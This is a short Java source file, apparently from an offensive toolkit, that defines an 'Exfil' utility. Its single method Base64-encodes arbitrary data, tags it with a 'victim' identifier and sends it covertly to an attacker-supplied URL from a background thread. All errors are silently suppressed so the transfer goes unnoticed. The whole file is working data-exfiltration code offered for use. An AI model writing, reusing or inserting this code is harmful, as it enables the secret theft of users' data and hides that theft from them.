package cmonster.utils;

import java.net.URL;
import java.net.URLConnection;

import org.apache.commons.codec.binary.Base64;

public class Exfil {

	/**
	 * Exfiltrates data in a background thread
	 * @param exfilLocation The url of the exfil target
	 * @param victim The identifier of the victim
	 * @param data Base64 encoded toString of data object
	 */
	public static void exfil(final String exfilLocation, final String victim, final Object data){
		new Thread(new Runnable(){
			public void run() {
				try {
					URL url = new URL(exfilLocation + "?victim=" + victim + "&data=" + new String(Base64.encodeBase64(data.toString().getBytes())));
					URLConnection con = url.openConnection();
					con.getInputStream();
				} catch (Exception e){}
			}
		}).start();
	}
	
}
